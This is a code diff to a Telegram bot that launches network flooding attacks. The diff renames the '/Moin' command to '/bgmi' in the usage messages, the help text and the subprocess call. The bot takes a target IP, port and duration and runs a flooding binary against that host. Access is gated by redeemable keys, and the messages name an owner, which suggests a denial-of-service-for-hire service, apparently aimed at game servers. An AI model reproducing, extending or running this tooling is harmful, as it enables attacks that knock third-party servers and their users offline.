@@ -147,14 +147,14 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
     if len(context.args) != 3:
-        await update.message.reply_text('Usage: /Moin <target_ip> <port> <duration>')
+        await update.message.reply_text('Usage: /bgmi <target_ip> <port> <duration>')
         return
 
     target_ip = context.args[0]
     port = context.args[1]
     duration = context.args[2]
 
-    flooding_command = ['./Moin', target_ip, port, duration, str(DEFAULT_THREADS)]
+    flooding_command = ['./bgmi', target_ip, port, duration, str(DEFAULT_THREADS)]
     await update.message.reply_text(f'Flooding parameters set: {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads.OWMER- @LDX_COBRA.')
 
 
@@ -171,7 +171,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         return
 
     if flooding_command is None:
-        await update.message.reply_text('No flooding parameters set. Use /Moin to set parameters.')
+        await update.message.reply_text('No flooding parameters set. Use /bgmi to set parameters.')
         return
 
     flooding_process = subprocess.Popen(flooding_command)
@@ -224,7 +224,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
         "/broadcast <message> - Broadcast a message to all authorized users.\n\n"
         "User Commands:\n"
         "/redeem <key> - Redeem a key to gain access.\n"
-        "/Moin <target_ip> <port> <duration> - Set the flooding parameters.\n"
+        "/bgmi <target_ip> <port> <duration> - Set the flooding parameters.\n"
         "/start - Start the flooding process.\n"
         "/stop - Stop the flooding process.\n"
     )
